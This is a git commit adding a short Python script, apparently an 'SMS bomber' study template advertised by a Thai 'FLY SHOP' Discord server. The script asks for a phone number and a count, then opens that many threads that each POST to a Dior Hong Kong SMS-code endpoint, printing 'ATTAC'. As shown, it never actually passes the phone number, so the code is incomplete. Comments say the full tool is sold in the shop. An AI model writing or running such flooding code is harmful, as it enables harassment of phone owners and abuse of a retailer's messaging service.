28dde24635aaacb662848da61c627493a7a5f8e3
Takliza <104025951+Takliza@users.noreply.github.com>
2022-12-20 00:14:51 +0700

    Add files via upload

---
+++ ll.py
@@ -0,0 +1,29 @@
+```
+#โครงศึกษาจากร้าน FLY SHOP
+import requests,json
+import os
+import time 
+import threading 
+from requests import get
+from re import search
+from requests import Session
+from threading import Thread
+os.system("clear")
+print()
+print("โครงศึกษา BY : FLY SHOP DISCOR : https://discord.com/invite/YknWyFmCGc ")
+print()
+phone = input("PHONE : ")
+print()
+num = int(input("NUM : "))
+print()
+
+def api1():
+    requests.post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_co") #ซื้อได้จากร้าน FLY SHOP DISCORD : https://discord.com/invite/YknWyFmCGc
+    print("ATTAC")
+    
+for i in range(num):
+    threading.Thread(target=api1).start()
+```
+    
+#โครงศึกษาจากร้าน FLY SHOP DISCORD : https://discord.com/invite/YknWyFmCGc
+#หากเเจกต่อกรุณาให้เครดิตร้านด้วยนะครับ
